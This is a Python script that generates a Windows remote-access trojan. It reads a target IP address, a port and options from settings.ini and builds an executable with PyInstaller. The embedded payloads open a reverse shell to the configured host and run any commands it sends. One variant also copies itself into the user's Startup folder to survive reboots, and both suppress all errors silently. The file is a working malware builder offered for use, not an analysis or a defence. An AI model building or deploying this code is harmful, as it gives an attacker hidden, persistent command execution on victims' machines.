#Remote Access Generator
import PyInstaller.__main__
import logging
import coloredlogs

logger = logging.getLogger(__name__)
fmt = ("[%(asctime)s] - %(message)s")
coloredlogs.install(fmt=fmt, logger=logger)

def settings():
    result = {}
    with open('settings.ini', 'r') as settings: 
        for line in settings:
            name, value = line.rstrip().split('= ', 2)
            result[name.strip().lower()] = value
    return result

values = settings()
if len(values) != 5:
    raise ValueError("Not given all results")

ip = values['[ip]']
port = values['[port]']
persistance = values['[startuppersistance]']
name = values['[filename]']
pause =  values['[startuptime]']
fullName = name + '.pyw'
bruhName = name + '.exe'
f = open(fullName, "w+")

banner = """
 ██▀███   ▄▄▄        ▄████ 
▓██ ▒ ██▒▒████▄     ██▒ ▀█▒
▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░
▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓
░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ 
  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░ 
  ░░   ░   ░   ▒   ░ ░   ░ 
   ░           ░  ░      ░ 
                           
                - Written By: Backslash
"""

code1 = """
# -*- coding: UTF-8 -*-
import socket
import os
import subprocess
import time

s = socket.socket()
host = """+'"'+ip+'"'+"""
port = """+port+"""
pause = """+pause+"""
try:
    time.sleep(pause)
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
except:
    pass

"""
code2 ="""
# -*- coding: UTF-8 -*-
import socket
import os
import subprocess
import time
import shutil
import getpass

s = socket.socket()
host = """+'"'+ip+'"'+"""
port = """+port+"""
pause = """+pause+"""
try:
    time.sleep(pause)

    try:
        shutil.copy2(os.path.abspath("""+'"'+bruhName+'"'+"""), 'C:/Users/'+getpass.getuser()+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
    except:
        pass
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
except:
    pass

"""


try:
    if persistance == "TRUE":
        print(banner)
        f.write(code2)
        f.close()
        logger.info('Success! Compiling into exe...')
        PyInstaller.__main__.run([fullName, '-n '+name+'', '--onefile'])
        logger.info('Successfully outputted to folder "dist" in this scripts directory ')
    else:
        print(banner)
        f.write(code1)
        f.close()
        logger.info('Success! Compiling into exe...')
        PyInstaller.__main__.run([fullName, '-n '+name+'', '--onefile'])
        logger.info('Finished Generating')
except Exception as err:
    logger.critical(err)